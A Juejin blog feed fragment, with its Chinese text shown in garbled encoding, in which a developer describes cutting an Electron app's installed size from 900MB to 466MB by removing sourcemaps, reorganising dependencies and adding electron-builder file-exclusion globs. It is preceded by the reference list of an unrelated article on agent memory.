<p>ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580582%26idx%3D2%26sn%3De3e66277ddaedc5f7caa9cd1ae12cd5d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580582&amp;idx=2&amp;sn=e3e66277ddaedc5f7caa9cd1ae12cd5d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AgentScope Java v1.0 å‘å¸ƒï¼Œè®© Java å¼€å‘è€…è½»æ¾æ„å»ºä¼ä¸šçº§ Agentic åº”ç”¨</a>ã€‹</p>
<p><strong>å‚è€ƒæ–‡æ¡£ï¼š</strong></p>
<p>[1] FlowLLM Context Engineering</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFlowLLM-AI%2Fflowllm%2Ftree%2Fmain%2Fdocs%2Fzh%2Freading" target="_blank" title="https://github.com/FlowLLM-AI/flowllm/tree/main/docs/zh/reading" ref="nofollow noopener noreferrer">github.com/FlowLLM-AI/â€¦</a></p>
<p>[2] Google ADK Memory</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fadk-docs%2Fsessions%2Fmemory%2F" target="_blank" title="https://google.github.io/adk-docs/sessions/memory/" ref="nofollow noopener noreferrer">google.github.io/adk-docs/seâ€¦</a></p>
<p>[3] LangChain Memory</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fpython%2Flangchain%2Flong-term-memory" target="_blank" title="https://docs.langchain.com/oss/python/langchain/long-term-memory" ref="nofollow noopener noreferrer">docs.langchain.com/oss/python/â€¦</a></p>
<p>[4] AgentScope Memory</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdoc.agentscope.io%2Fzh_CN%2Ftutorial%2Ftask_memory.html" target="_blank" title="https://doc.agentscope.io/zh_CN/tutorial/task_memory.html" ref="nofollow noopener noreferrer">doc.agentscope.io/zh_CN/tutorâ€¦</a></p>
<p>[5] O-MEM</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.13593" target="_blank" title="https://arxiv.org/abs/2511.13593" ref="nofollow noopener noreferrer">arxiv.org/abs/2511.13â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Electron ç˜¦èº«è®°ï¼šæˆ‘æ˜¯å¦‚ä½•æŠŠå®‰è£…å 900MB çš„"å·¨æ— éœ¸"ç åˆ° 466MB çš„ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589126217250062377</link>    <guid>https://juejin.cn/post/7589126217250062377</guid>    <pubDate>2025-12-29T09:46:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217250062377" data-draft-id="7589082912588415019" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Electron ç˜¦èº«è®°ï¼šæˆ‘æ˜¯å¦‚ä½•æŠŠå®‰è£…å 900MB çš„&quot;å·¨æ— éœ¸&quot;ç åˆ° 466MB çš„ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Electron,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-12-29T09:46:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mCell"/> <meta itemprop="url" content="https://juejin.cn/user/2280829967146779"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Electron ç˜¦èº«è®°ï¼šæˆ‘æ˜¯å¦‚ä½•æŠŠå®‰è£…å 900MB çš„"å·¨æ— éœ¸"ç åˆ° 466MB çš„ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2280829967146779/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mCell
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:46:04.000Z" title="Mon Dec 29 2025 09:46:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŒæ­¥è‡³ä¸ªäººç«™ç‚¹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fstack.mcell.top%2Fblog%2F2025%2F34_how-to-slim-down-electron-build-products" target="_blank" title="https://stack.mcell.top/blog/2025/34_how-to-slim-down-electron-build-products" ref="nofollow noopener noreferrer">Electron ç˜¦èº«è®°ï¼šæˆ‘æ˜¯å¦‚ä½•æŠŠå®‰è£…å 900MB çš„"å·¨æ— éœ¸"ç åˆ° 466MB çš„ï¼Ÿ</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dc0b71154b34dd09d3330b218f1e016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbUNlbGw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767606363&amp;x-signature=9UrMtisjPibuJqEGVHkWBUvXx78%3D" alt="089.webp" loading="lazy"/></p>
<p>æœ€è¿‘åœ¨å‚ä¸ä¸€ä¸ª Electron æ¡Œé¢ç«¯é¡¹ç›®å¼€å‘ã€‚ä½œä¸º Electron èŒæ–°ï¼Œæˆ‘åŸæœ¬ä»¥ä¸ºâ€œæ¡Œé¢ç«¯ = å†™å†™å‰ç«¯ + å¥—ä¸ªå£³â€ï¼Œç»“æœçœŸæ­£æŠ˜ç£¨äººçš„ï¼Œåè€Œæ˜¯å·¥ç¨‹åŒ–é‚£ä¸€å¨ï¼š<strong>æ‰“åŒ…æ„å»ºã€ç­¾åã€å…¬è¯ã€å‘å¸ƒæ›´æ–°ã€æ›´æ–°æµ‹è¯•</strong>â€¦â€¦å‘ç‚¹å¯†åº¦é«˜åˆ°ç¦»è°±ã€‚</p>
<p>å…ˆåæ§½ä¸¤å¥ï¼š</p>
<ul>
<li>macOS æ‰“åŒ…è¦èµ°ç­¾å + å…¬è¯ï¼ˆNotarizationï¼‰æµç¨‹ï¼Œç¬¬ä¸€æ¬¡æçš„æ—¶å€™ä½ ä¼šæ€€ç–‘è‡ªå·±æ˜¯ä¸æ˜¯åœ¨ç»™è‹¹æœå†™è®ºæ–‡ã€‚</li>
<li>è‡ªåŠ¨æ›´æ–°æµ‹è¯•æ›´éš¾ç»·ï¼šä¸ºäº†æµ‹ Windows çš„æ›´æ–°é“¾è·¯ï¼Œä½ ç”šè‡³å¾—åœ¨ macOS ä¸Šå¼€ä¸ª Windows è™šæ‹Ÿæœºâ€¦â€¦ï¼ˆæ˜¯çš„ï¼Œæˆ‘çœŸçš„å¹²è¿‡ï¼‰</li>
</ul>
<p>ä½†è®©æˆ‘å°è±¡æœ€æ·±åˆ»ã€ä¹Ÿæœ€æœ‰æˆå°±æ„Ÿçš„ï¼Œæ˜¯ä¸€æ¬¡å¾ˆâ€œå®åœ¨â€çš„å·¥ä½œï¼š<strong>æ„å»ºäº§ç‰©ä½“ç§¯ä¼˜åŒ–</strong>ã€‚</p>
<p>å› ä¸ºå®ƒç›´æ¥å½±å“ä¸‰ä»¶äº‹ï¼š</p>
<ol>
<li>ç”¨æˆ·ä¸‹è½½/å®‰è£…ä½“éªŒï¼ˆä½ ä¸å¸Œæœ›ç”¨æˆ·ä¸‹è½½ä¸€ä¸ªâ€œ3A å¤§ä½œâ€ï¼‰</li>
<li>å¯åŠ¨é€Ÿåº¦ï¼ˆå›¾æ ‡è·³åŠå¤©æ‰å¼€ï¼ŒçœŸçš„å¾ˆè´¥å¥½æ„Ÿï¼‰</li>
<li>å‘å¸ƒæµç¨‹æˆæœ¬ï¼ˆåŒ…è¶Šå¤§ï¼Œç­¾å/å…¬è¯/ä¸Šä¼ /åˆ†å‘è¶ŠæŠ˜ç£¨ï¼‰</li>
</ol>
<p>è¿™ç¯‡å°±è®°å½•ä¸€ä¸‹ï¼šæˆ‘æ€ä¹ˆä» <strong>DMG 240MBã€å®‰è£…å 900MB+</strong>ï¼Œåšåˆ° <strong>DMG 155MBã€å®‰è£…å 466MB</strong>ã€‚</p>
<h2 data-id="heading-0">å…ˆçœ‹ç»“æœï¼šä½“ç§¯å˜åŒ–</h2>
<p>æœ€åˆç‰ˆæœ¬ï¼š</p>
<ul>
<li>macOS dmgï¼š<strong>240MB</strong></li>
<li>å®‰è£…åï¼š<strong>900MB+</strong></li>
<li>ä½“éªŒï¼šå¯åŠ¨æ…¢ï¼Œèœå•æ å›¾æ ‡ç–¯ç‹‚å¼¹è·³ï¼Œå¼¹åˆ°æˆ‘æ€€ç–‘äººç”Ÿ</li>
</ul>
<p>ä¼˜åŒ–åï¼š</p>
<ul>
<li>macOS-arm.dmgï¼š<strong>155MB</strong></li>
<li>å®‰è£…åï¼š<strong>466MB</strong></li>
<li>ä½“éªŒï¼šå¯åŠ¨é€Ÿåº¦è‚‰çœ¼å¯è§åœ°æ­£å¸¸äº†</li>
</ul>
<h2 data-id="heading-1">ç¬¬ä¸€æ€§åŸåˆ™ï¼šåˆ«çŒœï¼Œå…ˆæŠŠåŒ…æ‹†å¼€çœ‹</h2>
<p>æˆ‘ä¸€å¼€å§‹çŠ¯çš„é”™å°±æ˜¯â€œå‡­æ„Ÿè§‰ä¼˜åŒ–â€ã€‚åé¢å‘ç°è¿™äº‹å¿…é¡»å›åˆ°æœ€æœ´ç´ çš„æ–¹æ³•ï¼š</p>
<blockquote>
<p><strong>æŠŠæ„å»ºäº§ç‰©å±•å¼€/è§£å‹ï¼Œçœ‹çœ‹åˆ°åº•æ˜¯è°åœ¨å ç©ºé—´ã€‚</strong></p>
</blockquote>
<p>åœ¨ macOS ä¸Šä½ å¯ä»¥ï¼š</p>
<ul>
<li>dmg æŒ‚è½½åæ‰¾åˆ° <code>.app</code></li>
<li>å³é”® â†’ æ˜¾ç¤ºåŒ…å†…å®¹ â†’ <code>Contents/Resources/</code></li>
<li>å¸¸è§ç»“æ„é‡Œä¼šæœ‰ <code>app.asar</code> / <code>app.asar.unpacked</code> ç­‰</li>
</ul>
<p>ç„¶åç”¨æœ€åœŸä½†æœ€æœ‰æ•ˆçš„æ–¹å¼æŸ¥ä½“ç§¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">du</span> -sh <span class="hljs-string">"YourApp.app"</span>
<span class="hljs-built_in">du</span> -sh <span class="hljs-string">"YourApp.app/Contents/Resources"</span>/*
</code></pre>
<p>å½“æˆ‘ç¬¬ä¸€æ¬¡çœ‹åˆ°ç»“æœæ—¶ï¼ŒåŸºæœ¬å°±ç ´æ¡ˆäº†ï¼š</p>
<ul>
<li><code>.map</code> æœ‰ï¼Œä½†ä¸æ˜¯ä¸»çŠ¯</li>
<li>çœŸæ­£ç¦»è°±çš„æ˜¯ï¼š<strong>node_modules</strong>ï¼ˆä½“ç§¯å¤§å¾—åƒæ˜¯æŠŠæ•´ä¸ªå¼€å‘ç¯å¢ƒä¸€èµ·æ‰“è¿›å»äº†ï¼‰</li>
</ul>
<h2 data-id="heading-2">ç¬¬ä¸€åˆ€ï¼šå‘å¸ƒç‰ˆæœ¬åˆ«å¸¦ SourceMapï¼ˆåˆ«æŠŠæºç çº¿ç´¢å¡ç»™ç”¨æˆ·ï¼‰</h2>
<p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åš Electron å‘å¸ƒï¼Œå‘å¸ƒç¬¬ä¸€ä¸ªå†…éƒ¨æµ‹è¯•ç‰ˆæ—¶æˆ‘å±…ç„¶æ²¡å…³ sourcemapã€‚</p>
<p>åŒäº‹ä¸€å¥è¯æŠŠæˆ‘ç‚¹é†’ï¼šâ€œä½ è¿™åŒ…é‡Œæ€ä¹ˆèƒ½çœ‹åˆ°æºç ç—•è¿¹ï¼Ÿâ€</p>
<p>æˆ‘å»ç¿»æ„å»ºäº§ç‰©ï¼šå¥½å®¶ä¼™ï¼Œ<code>.map</code> çœŸåœ¨é‡Œé¢ã€‚</p>
<p>è™½ç„¶ sourcemap é€šå¸¸ä¸ä¼šå å‡ ç™¾ MBï¼Œä½†å®ƒæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li><strong>å®‰å…¨æ€§ / æ³„éœ²é£é™©</strong></li>
<li><strong>å®ƒå±äºâ€œä½ ä¸è¯¥å¸¦â€çš„ä¸œè¥¿</strong>ï¼ˆè¯¥æ¸…ç†å°±æ¸…ç†ï¼‰</li>
</ul>
<p>äºæ˜¯æˆ‘å…ˆåœ¨æ„å»ºä¾§å…³æ‰ sourcemapï¼Œå¹¶åœ¨æ‰“åŒ…è§„åˆ™é‡Œä¹Ÿé¡ºæ‰‹æ’é™¤ <code>.map</code>ï¼ˆåŒä¿é™©ï¼‰ã€‚</p>
<h2 data-id="heading-3">ç¬¬äºŒåˆ€ï¼šä¾èµ–æ²»ç†â€”â€”â€œnpm install xxx ä¸€æŠŠæ¢­â€çš„å†å²å€ºï¼Œè¦è¿˜</h2>
<p>æ¥ä¸‹æ¥å°±æ˜¯ node_modules ç˜¦èº«ã€‚</p>
<p>æˆ‘ä»¥å‰è£…ä¾èµ–çš„ä¹ æƒ¯éå¸¸ç²—æš´ï¼š<code>npm install xxx</code>ï¼Œèƒ½è·‘å°±è¡Œï¼›<strong>æ ¹æœ¬ä¸åœ¨ä¹å®ƒåº”è¯¥åœ¨ dependencies è¿˜æ˜¯ devDependencies</strong>ã€‚</p>
<p>è¿™åœ¨ Web é¡¹ç›®é‡Œå¯èƒ½ä¸è‡´å‘½ï¼Œä½†åœ¨ Electron æ‰“åŒ…é‡Œéå¸¸è‡´å‘½ï¼šä½ åˆ†é”™äº†ä¾èµ–ï¼Œæ„å»ºäº§ç‰©å°±ä¼šå¸®ä½ æŠŠä¸€å †å¼€å‘å·¥å…·ã€ç±»å‹ã€è„šæ‰‹æ¶ã€lintã€æµ‹è¯•ç›¸å…³ï¼Œå…¨å¡è¿›æœ€ç»ˆ Appã€‚</p>
<p>æˆ‘å½“æ—¶åšäº†ä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li><strong>æ¸…ç† package.json é‡Œå‹æ ¹æ²¡ç”¨çš„åºŸå¼ƒåŒ…</strong>
ï¼ˆè¿™ç§æ˜¯çº¯æ”¶ç›Šï¼Œåˆ å°±å®Œäº‹äº†ï¼‰</li>
<li><strong>é‡æ–°æ•´ç† dependencies / devDependencies</strong>
æˆ‘ç”šè‡³è¯· Claude Code å¸®æˆ‘åˆ†äº†ä¸€éï¼ˆå› ä¸ºæˆ‘å½“æ—¶çœŸçš„æ²¡ç»éªŒï¼Œé è‡ªå·±å¾ˆå®¹æ˜“æ¼ï¼‰</li>
</ol>
<p>è¿™ä¸€è½®åšå®Œå†æ„å»ºï¼š</p>
<ul>
<li>å®‰è£…ä½“ç§¯ä» <strong>900MB â†’ 600MB+</strong></li>
</ul>
<p>æˆ‘å½“æ—¶å¾ˆå¼€å¿ƒï¼Œä½†å†·é™æƒ³æƒ³ï¼š<strong>600MB çš„æ¡Œé¢è½¯ä»¶è¿˜æ˜¯å¤§å¾—ç¦»è°±ã€‚</strong></p>
<p>æ‰€ä»¥ç»§ç»­æ‹†åŒ…ã€‚</p>
<h2 data-id="heading-4">ç¬¬ä¸‰åˆ€ï¼šnode_modules é‡Œå…¨æ˜¯â€œä½ æ ¹æœ¬ä¸éœ€è¦â€çš„æ–‡ä»¶</h2>
<p>å½“ node_modules å˜å°ä¹‹åï¼Œæˆ‘ç»§ç»­å¾€é‡Œçœ‹ï¼Œç»“æœåˆå‘ç°ä¸€å †â€œè„‚è‚ªâ€ï¼š</p>
<ul>
<li><code>README.md / CHANGELOG.md / HISTORY.md / LICENSE</code></li>
<li><code>tests / __tests__ / examples / docs / coverage</code></li>
<li><code>.d.ts</code></li>
<li><code>.map</code></li>
<li>ç”šè‡³è¿˜æœ‰ <code>*.ts / *.tsx</code> æºç ã€é…ç½®æ–‡ä»¶ï¼ˆrollup/webpack/tsconfigï¼‰</li>
</ul>
<p>è¿™äº›å¯¹ç”¨æˆ·è¿è¡Œ App æ¥è¯´å‡ ä¹æ²¡ä»·å€¼ã€‚</p>
<p>å½¢è±¡ç‚¹è®²ï¼šè¿™å°±åƒä½ ä¹°æŠ«è¨ï¼Œå¨å¸ˆæŠŠé¢ç²‰è¢‹å­ã€çƒ¤ç®±è¯´æ˜ä¹¦ã€ç”šè‡³å·¥ä½œç¬”è®°ä¹Ÿä¸€èµ·å¡ç»™ä½ ã€‚</p>
<p>äºæ˜¯æˆ‘é‡åˆ°äº†å…³é”®é—®é¢˜ï¼š</p>
<blockquote>
<p>æ€ä¹ˆç³»ç»Ÿæ€§å‰”é™¤è¿™äº›æ–‡ä»¶ï¼Ÿ
éš¾é“è¦æ‰“åŒ…å‰å» node_modules æ‰‹åŠ¨åˆ ï¼Ÿï¼ˆé‚£ä¹Ÿå¤ªåŸå§‹äº†ï¼‰</p>
</blockquote>
<h2 data-id="heading-5">å…³é”®æ–¹æ¡ˆï¼šelectron-builder çš„ files è§„åˆ™ï¼Œç²¾å‡†æ’é™¤</h2>
<p>æˆ‘æœ€ç»ˆè½åœ¨ <code>electron-builder</code> çš„ <code>build.files</code> é…ç½®ä¸Šï¼šç”¨ glob æ¨¡å¼æ˜ç¡®å‘Šè¯‰æ‰“åŒ…å·¥å…·â€œå“ªäº›è¦ã€å“ªäº›ä¸è¦â€ã€‚</p>
<p>æ ¸å¿ƒæ€è·¯å¾ˆç®€å•ï¼š</p>
<ul>
<li>åªæ‰“åŒ…ä½ çš„ <code>dist</code> / <code>dist-electron</code></li>
<li>æ’é™¤ <code>.map</code></li>
<li>æ’é™¤æ‰€æœ‰ <code>*.md / *.ts / *.tsx</code> ç­‰â€œå¼€å‘è€…æ–‡ä»¶â€</li>
<li>node_modules é‡Œé‡ç‚¹æ¸…ç†ï¼šæ–‡æ¡£ã€æµ‹è¯•ã€ç±»å‹ã€é”æ–‡ä»¶ã€å·¥å…·è„šæœ¬ã€éšè—æ–‡ä»¶ç­‰</li>
</ul>
<p>è¿™æ˜¯æˆ‘æœ€ç»ˆçš„é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"files"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-string">"dist/**/*"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"dist-electron/**/*"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!dist/**/*.map"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!dist-electron/**/*.map"</span><span class="hljs-punctuation">,</span>

  <span class="hljs-string">"!**/*.{ts,tsx,md}"</span><span class="hljs-punctuation">,</span>

  <span class="hljs-string">"!**/node_modules/*/{CHANGELOG.md,README.md,README,readme.md,readme,HISTORY.md,CONTRIBUTING.md}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/{test,__tests__,tests,powered-test,example,examples,coverage,docs,doc}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*.d.ts"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/.bin"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/*.md"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/*.markdown"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/LICENSE*"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/{.github,.vscode,.idea}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/{rollup.config.js,webpack.config.js,tsconfig.json}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/.*"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/**/*.map"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/**/*.{spec,test}.{js,jsx,ts,tsx}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/*/{yarn.lock,package-lock.json,pnpm-lock.yaml}"</span><span class="hljs-punctuation">,</span>

  <span class="hljs-string">"!**/node_modules/lucide-react/dist/*.{ts,tsx}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-string">"!**/node_modules/@types"</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>é…ç½®å®Œï¼Œæˆ‘ç‚¹å‡»æ„å»ºæŒ‰é’®ã€‚ç”µè„‘å¼€å§‹å‘çƒ«ã€é£æ‰‡ç‹‚è½¬ï¼Œæˆ‘å¼€å§‹ç¥ˆç¥·ä¸è¦å‡ºâ€œè¿è¡Œæ—¶æŠ¥é”™æ‰¾ä¸åˆ°æŸä¸ªæ–‡ä»¶â€çš„åœ°ç‹±åœºæ™¯ã€‚</p>
<p>ç»“æœï¼š</p>
<ul>
<li><code>macos-arm.dmg</code>: <strong>155MB</strong>ï¼ˆåŸ 240MBï¼‰</li>
<li>å®‰è£…åï¼š<strong>466MB</strong>ï¼ˆåŸ 900MB+ï¼‰</li>
</ul>
<p>ä½“ç§¯å‡ ä¹å‡åŠï¼Œè€Œä¸”åŠŸèƒ½æ²¡ç¼ºã€å¯åŠ¨ä¹Ÿæ˜æ˜¾å˜å¿«ã€‚</p>
<h2 data-id="heading-6">è¿™ç±»â€œåˆ æ–‡ä»¶å¼ç˜¦èº«â€æœ‰é£é™©å—ï¼Ÿ</h2>
<p>æœ‰ï¼Œä½†å¯æ§ã€‚</p>
<p>å› ä¸ºç¡®å®å­˜åœ¨å°‘æ•°åŒ…ä¼šåœ¨è¿è¡Œæ—¶è¯»å–æŸäº›èµ„æºæ–‡ä»¶ï¼ˆç”šè‡³æ˜¯ä½ ä»¥ä¸ºâ€œæ–‡æ¡£/é…ç½®â€çš„ä¸œè¥¿ï¼‰ã€‚æ‰€ä»¥æˆ‘çš„ç­–ç•¥æ˜¯ï¼š</p>
<ol>
<li><strong>å…ˆæ’é™¤æœ€é€šç”¨çš„ä¸€æ‰¹ï¼šmd/tests/docs/types/map/lockfile</strong></li>
<li>æ‰“å®ŒåŒ…ä¹‹ååšä¸€è½®å®Œæ•´å›å½’ï¼ˆé‡ç‚¹ï¼šå¯åŠ¨ã€å…³é”®è·¯å¾„ã€æ›´æ–°é“¾è·¯ï¼‰</li>
<li>å¦‚æœæŸä¸ªä¾èµ–çœŸçš„éœ€è¦æŸç±»æ–‡ä»¶ï¼Œå†å¯¹å®ƒåšâ€œä¾‹å¤–æ”¾è¡Œâ€ï¼ˆç™½åå•ï¼‰</li>
</ol>
<p>è¿™æ¯”â€œæ‰‹åŠ¨åˆ  node_modulesâ€é è°±å¤ªå¤šäº†ï¼šå¯é‡å¤ã€å¯è¿½è¸ªã€å¯å›æ»šã€‚</p>
<h2 data-id="heading-7">å·¥ç¨‹åŒ–ä¸åªæ˜¯â€œèƒ½è·‘â€ï¼Œè€Œæ˜¯â€œäº¤ä»˜å¯æ§â€</h2>
<p>å›å¤´çœ‹ï¼Œæˆ‘ä»â€œèƒ½æ‰“å‡ºæ¥å°±è¡Œâ€çš„å¿ƒæ€ï¼Œå˜æˆäº†ï¼š</p>
<ul>
<li>æˆ‘çŸ¥é“æœ€ç»ˆäº§ç‰©é‡Œæœ‰ä»€ä¹ˆ</li>
<li>æˆ‘çŸ¥é“å“ªäº›æ–‡ä»¶ä¸è¯¥è¿›å»</li>
